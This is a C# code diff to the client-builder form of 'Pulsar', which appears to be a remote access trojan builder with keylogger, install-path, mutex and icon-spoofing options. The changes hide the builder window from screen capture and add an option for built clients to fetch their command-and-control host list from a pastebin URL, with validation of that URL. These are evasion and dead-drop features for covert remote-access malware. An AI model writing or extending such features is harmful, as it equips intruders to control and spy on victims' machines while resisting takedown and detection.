@@ -31,6 +31,7 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
+			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
             txtHost.TextChanged += txtHost_TextChanged;
             txtHost.KeyDown += TxtHost_KeyDown;
@@ -53,6 +54,25 @@ namespace Pulsar.Server.Forms
             portSetDelayTimer = new System.Windows.Forms.Timer();
             portSetDelayTimer.Interval = 1000;
             portSetDelayTimer.Tick += PortSetDelayTimer_Tick;
+            
+            checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
+            UpdatePastebinUI();
+        }
+        
+        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+            UpdatePastebinUI();
+        }
+        
+        private void UpdatePastebinUI()
+        {
+            txtHost.Enabled = !checkBox1.Checked;
+            numericUpDownPort.Enabled = !checkBox1.Checked;
+            btnAddHost.Enabled = !checkBox1.Checked;
+            lstHosts.Enabled = !checkBox1.Checked;
+            
+            txtPastebin.Enabled = checkBox1.Checked;
         }
 
         private bool IsValidHostPortFormat(string text)
@@ -194,6 +214,8 @@ namespace Pulsar.Server.Forms
             txtOriginalFilename.Text = profile.OriginalFilename;
             txtProductVersion.Text = profile.ProductVersion;
             txtFileVersion.Text = profile.FileVersion;
+            txtPastebin.Text = profile.Pastebin;
+            checkBox1.Checked = profile.EnablePastebin;
 
             _profileLoaded = true;
         }
@@ -207,6 +229,7 @@ namespace Pulsar.Server.Forms
             profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
             profile.Pastebin = txtPastebin.Text;
+            profile.EnablePastebin = checkBox1.Checked;
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallName.Text;
             profile.InstallPath = GetInstallPath();
@@ -245,6 +268,7 @@ namespace Pulsar.Server.Forms
             UpdateAssemblyControlStates();
             UpdateIconControlStates();
             UpdateKeyloggerControlStates();
+            UpdatePastebinUI();
         }
 
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
@@ -406,16 +430,25 @@ namespace Pulsar.Server.Forms
             if (checkBox1.Checked)
             {
                 options.RawHosts = txtPastebin.Text;
-                options.Pastebin = txtPastebin.Text;
+                options.Pastebin = true;
+                
+                // Validate the pastebin URL
+                if (string.IsNullOrWhiteSpace(options.RawHosts) || 
+                    (!options.RawHosts.StartsWith("http://") && !options.RawHosts.StartsWith("https://")))
+                {
+                    throw new Exception("Please enter a valid URL for the pastebin. It should start with http:// or https://");
+                }
             }
             else
             {
-                options.Pastebin = "";
+                options.Pastebin = false;
                 options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
+                
+                if (options.RawHosts.Length < 2)
+                {
+                    throw new Exception("Please enter a valid host to connect to.");
+                }
             }
-                
-                
-
             
             options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
@@ -437,11 +470,6 @@ namespace Pulsar.Server.Forms
             if (!File.Exists("client.bin"))
             {
                 throw new Exception("Could not locate \"client.bin\" file. It should be in the same directory as Pulsar.");
-            }
-
-            if (options.RawHosts.Length < 2 && !checkBox1.Checked)
-            {
-                throw new Exception("Please enter a valid host to connect to.");
             }
 
             if (chkChangeIcon.Checked)
